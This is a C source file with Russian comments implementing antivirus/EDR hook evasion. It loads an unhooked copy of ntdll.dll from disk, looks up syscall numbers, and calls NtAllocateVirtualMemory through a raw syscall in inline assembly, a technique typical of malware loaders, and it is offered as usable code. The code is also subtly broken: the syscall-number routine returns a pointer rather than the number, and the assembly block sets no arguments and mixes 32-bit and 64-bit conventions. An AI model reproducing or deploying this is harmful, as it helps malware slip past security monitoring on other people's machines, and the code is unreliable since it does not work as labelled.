#include <windows.h>
#include <stdio.h>

// Получаем чистый ntdll.dll с диска (минуя hooked version в памяти)
HMODULE GetCleanNtdll() {
    char sysdir[MAX_PATH];
    GetSystemDirectoryA(sysdir, MAX_PATH);
    strcat(sysdir, "\\ntdll.dll");
    
    HANDLE hFile = CreateFileA(sysdir, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, fileSize, NULL);
    LPVOID mapAddr = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, fileSize);
    
    // Парсим PE заголовок и загружаем чистый ntdll
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mapAddr;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)mapAddr + dos->e_lfanew);
    
    // Выделяем память под чистую копию
    HMODULE cleanNtdll = (HMODULE)VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Копируем заголовки и секции
    memcpy(cleanNtdll, mapAddr, nt->OptionalHeader.SizeOfHeaders);
    
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        void* dest = (void*)((DWORD_PTR)cleanNtdll + section[i].VirtualAddress);
        void* src = (void*)((DWORD_PTR)mapAddr + section[i].PointerToRawData);
        memcpy(dest, src, section[i].SizeOfRawData);
    }
    
    UnmapViewOfFile(mapAddr);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    
    return cleanNtdll;
}

// Получаем syscall номер по имени функции
DWORD GetSyscallNumber(HMODULE ntdll, const char* funcName) {
    FARPROC func = GetProcAddress(ntdll, funcName);
    BYTE* bytes = (BYTE*)func;
    
    // Ищем mov eax, SSN (B8 XX XX XX XX)
    for (int i = 0; i < 32; i++) {
        if (bytes[i] == 0xB8) { // mov eax
            return (DWORD)(bytes + i + 1);
        }
    }
    return 0;
}

void ExecuteIndirectSyscall() {
    HMODULE cleanNtdll = GetCleanNtdll();
    DWORD ssn = GetSyscallNumber(cleanNtdll, "NtAllocateVirtualMemory");
    
    // Выполняем syscall напрямую через asm
    __asm {
        mov eax, ssn
        mov edx, esp
        syscall
        ret
    }
}
